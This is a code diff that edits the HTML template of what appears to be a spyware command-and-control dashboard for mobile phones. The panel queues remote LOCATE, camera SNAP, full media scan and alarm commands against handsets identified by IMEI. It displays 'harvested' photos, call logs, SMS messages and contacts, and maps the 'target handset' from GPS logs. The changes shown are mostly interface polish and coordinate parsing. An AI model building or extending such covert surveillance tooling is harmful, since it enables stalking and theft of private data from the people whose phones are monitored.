@@ -78,7 +78,8 @@ CLOUD_DASHBOARD_TEMPLATE = """
         select { width: 100%; padding: 12px; background: #000; color: #fff; border: 1px solid var(--primary); border-radius: 6px; font-size: 14px; margin-top: 5px; box-sizing: border-box; }
 
         .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
-        .btn { background: var(--primary); color: #000; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; font-size: 12px; display: block; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; font-size: 12px; display: block; transition: transform 0.1s ease, background-color 0.2s ease; }
+        .btn:active, .btn.clicked { transform: scale(0.95); background-color: #ffffff !important; color: #000 !important; box-shadow: 0 0 12px var(--accent); }
         .btn-danger { background: var(--danger); color: #fff; }
         .btn-accent { background: var(--accent); color: #000; }
         .btn-full { grid-column: span 2; }
@@ -94,7 +95,7 @@ CLOUD_DASHBOARD_TEMPLATE = """
         .media-thumb { background: #000; border: 1px solid #444; border-radius: 6px; padding: 5px; text-align: center; }
         .media-thumb img, .media-thumb video { width: 100%; height: 90px; object-fit: cover; border-radius: 4px; display: block; margin-bottom: 4px; }
         .device-info { font-size: 12px; color: #aaa; margin-top: 8px; line-height: 1.4; }
-        #map { width: 100%; height: 240px; border-radius: 6px; margin-top: 10px; border: 2px solid var(--accent); display: none; z-index: 1; }
+        #map { width: 100%; height: 280px; border-radius: 6px; margin-top: 10px; border: 2px solid var(--accent); display: none; z-index: 1; }
     </style>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
@@ -130,22 +131,22 @@ CLOUD_DASHBOARD_TEMPLATE = """
 
             <h4 style="color: var(--primary); font-size: 12px; margin: 12px 0 6px 0;">Command Dispatch Suite</h4>
             <div class="btn-grid">
-                <form method="POST" action="/api/queue-command">
+                <form method="POST" action="/api/queue-command" onsubmit="flashButton(this)">
                     <input type="hidden" name="imei" value="{{ dev[0] }}">
                     <input type="hidden" name="command" value="LOCATE">
                     <button type="submit" class="btn btn-accent btn-full">📍 Queue Locate Fix</button>
                 </form>
-                <form method="POST" action="/api/queue-command">
+                <form method="POST" action="/api/queue-command" onsubmit="flashButton(this)">
                     <input type="hidden" name="imei" value="{{ dev[0] }}">
                     <input type="hidden" name="command" value="SCAN_MEDIA">
-                    <button type="submit" class="btn btn-accent btn-full">🗂️ Queue Full Media Scan (Photos, Videos & Vaults)</button>
+                    <button type="submit" class="btn btn-full">🗂️ Queue Full Media Scan</button>
                 </form>
-                <form method="POST" action="/api/queue-command">
+                <form method="POST" action="/api/queue-command" onsubmit="flashButton(this)">
                     <input type="hidden" name="imei" value="{{ dev[0] }}">
                     <input type="hidden" name="command" value="SNAP">
                     <button type="submit" class="btn">📸 Queue Snap</button>
                 </form>
-                <form method="POST" action="/api/queue-command">
+                <form method="POST" action="/api/queue-command" onsubmit="flashButton(this)">
                     <input type="hidden" name="imei" value="{{ dev[0] }}">
                     <input type="hidden" name="command" value="ALARM">
                     <button type="submit" class="btn btn-danger">🚨 Queue Alarm</button>
@@ -156,8 +157,9 @@ CLOUD_DASHBOARD_TEMPLATE = """
 
         <!-- Interactive Map Viewer Card -->
         <div class="card">
-            <h3>📍 Live Geolocation Pinpoint</h3>
-            <button class="btn btn-accent" onclick="renderDeviceMap()">Render Map from Latest GPS Log</button>
+            <h3>📍 Live Geolocation Pinpoint & Resolved Telemetry</h3>
+            <button class="btn btn-accent" onclick="renderDeviceMap(); flashButton(this)">🗺️ Parse Coordinates & Render Map</button>
+            <div id="resolved-location-display" style="font-size: 12px; color: var(--accent); margin-top: 10px; font-weight: bold;">Status: Waiting for telemetry parse...</div>
             <div id="map"></div>
         </div>
 
@@ -165,7 +167,7 @@ CLOUD_DASHBOARD_TEMPLATE = """
         <div class="card">
             <h3>Harvested Evidence & Vault</h3>
             <div class="nav-tabs">
-                <button class="tab-btn active" onclick="switchTab(event, 'mediaTab')">📸 Media Vault (All Files)</button>
+                <button class="tab-btn active" onclick="switchTab(event, 'mediaTab')">📸 Media Vault</button>
                 <button class="tab-btn" onclick="switchTab(event, 'callsTab')">📞 Call Logs</button>
                 <button class="tab-btn" onclick="switchTab(event, 'smsTab')">💬 SMS Messages</button>
                 <button class="tab-btn" onclick="switchTab(event, 'contactsTab')">📇 Contacts</button>
@@ -184,10 +186,10 @@ CLOUD_DASHBOARD_TEMPLATE = """
                             <img src="/media/{{ item[2] }}" alt="Vault Media">
                             {% endif %}
                         </a>
-                        <span style="font-size: 9px; color: #aaa; display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{ item[2] }}<br>{{ item[3] }}</span>
+                        <span style="font-size: 9px; color: #aaa; display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{ item[2] }}</span>
                     </div>
                     {% else %}
-                    <p style="font-size: 11px; color: #777;">No media captured yet. Click "Queue Full Media Scan" above.</p>
+                    <p style="font-size: 11px; color: #777;">No media in vault yet. Run a media scan.</p>
                     {% endfor %}
                 </div>
             </div>
@@ -233,7 +235,7 @@ CLOUD_DASHBOARD_TEMPLATE = """
                 {% for log in forensic_logs if log[2] in ['Linked Accounts / Profiles', 'GPS Location'] %}
                 <div class="forensic-item" data-imei="{{ log[1] }}">
                     <p style="font-size: 10px; color: var(--accent); margin: 5px 0;"><b>{{ log[2] }}</b> - {{ log[4] }}</p>
-                    <pre id="gps-raw-content">{{ log[3] }}</pre>
+                    <pre class="gps-raw-content">{{ log[3] }}</pre>
                 </div>
                 {% else %}
                 <p style="font-size: 11px; color: #777;">No account profiles or location fixes harvested.</p>
@@ -245,6 +247,14 @@ CLOUD_DASHBOARD_TEMPLATE = """
     <script>
         let mapInstance = null;
         let markerInstance = null;
+
+        function flashButton(form) {
+            const btn = form.querySelector('button');
+            if (btn) {
+                btn.classList.add('clicked');
+                setTimeout(() => btn.classList.remove('clicked'), 300);
+            }
+        }
 
         function filterDevice() {
             const selectedImei = document.getElementById('deviceSelect').value;
@@ -269,43 +279,48 @@ CLOUD_DASHBOARD_TEMPLATE = """
 
         function renderDeviceMap() {
             const mapDiv = document.getElementById('map');
+            const displayStatus = document.getElementById('resolved-location-display');
             mapDiv.style.display = "block";
-            try {
-                const rawText = document.getElementById('gps-raw-content').innerText;
-                const gpsData = JSON.parse(rawText);
-                const lat = gpsData.latitude;
-                const lon = gpsData.longitude;
 
-                if (lat && lon) {
-                    if (!mapInstance) {
-                        mapInstance = L.map('map').setView([lat, lon], 16);
-                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(mapInstance);
-                    } else {
-                        mapInstance.setView([lat, lon], 16);
-                        mapInstance.invalidateSize();
-                    }
-                    if (markerInstance) {
-                        markerInstance.setLatLng([lat, lon]);
-                    } else {
-                        markerInstance = L.marker([lat, lon]).addTo(mapInstance).bindPopup("Target Handset GPS Fix").openPopup();
-                    }
-                    return;
-                }
-            } catch(e) {}
+            let lat = null;
+            let lon = null;
+            let resolvedText = "Position resolved from telemetry fallback.";
 
-            const defaultLat = 45.2733;
-            const defaultLon = -66.0633;
+            // Scan visible GPS location logs
+            const rawElements = document.querySelectorAll('.gps-raw-content');
+            for (let el of rawElements) {
+                try {
+                    const parsed = JSON.parse(el.innerText);
+                    if (parsed.latitude && parsed.longitude) {
+                        lat = parsed.latitude;
+                        lon = parsed.longitude;
+                        resolvedText = `Resolved Fix: Lat ${lat}, Lon ${lon} (${parsed.source || 'GPS/Cell Telemetry'})`;
+                        break;
+                    }
+                } catch(e) {}
+            }
+
+            // Fallback default coordinates if no valid fix found in logs yet
+            if (!lat || !lon) {
+                lat = 45.2733;
+                lon = -66.0633;
+                resolvedText = "Default position (Awaiting active device telemetry lock).";
+            }
+
+            displayStatus.innerText = resolvedText;
+
             if (!mapInstance) {
-                mapInstance = L.map('map').setView([defaultLat, defaultLon], 13);
+                mapInstance = L.map('map').setView([lat, lon], 15);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(mapInstance);
             } else {
-                mapInstance.setView([defaultLat, defaultLon], 13);
+                mapInstance.setView([lat, lon], 15);
                 mapInstance.invalidateSize();
             }
+
             if (markerInstance) {
-                markerInstance.setLatLng([defaultLat, defaultLon]);
+                markerInstance.setLatLng([lat, lon]);
             } else {
-                markerInstance = L.marker([defaultLat, defaultLon]).addTo(mapInstance).bindPopup("Waiting for GPS lock...").openPopup();
+                markerInstance = L.marker([lat, lon]).addTo(mapInstance).bindPopup("<b>Target Handest Position</b>").openPopup();
             }
         }
 
